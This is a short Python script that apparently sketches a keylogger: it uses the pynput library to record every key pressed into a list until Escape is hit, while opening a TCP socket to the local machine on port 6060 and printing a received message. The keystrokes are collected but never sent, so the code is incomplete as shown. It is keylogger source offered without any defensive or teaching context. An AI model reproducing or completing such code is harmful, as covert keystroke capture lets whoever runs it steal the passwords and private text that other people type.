import socket
import pynput

from pynput.keyboard import Key, Listener

keystroke = []

def on_press(key):
    keystroke.append(key)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((socket.gethostname(), 6060))
    listener.join()
    
message = s.recv(2048)

print(f"Message received: {message}")
s.close()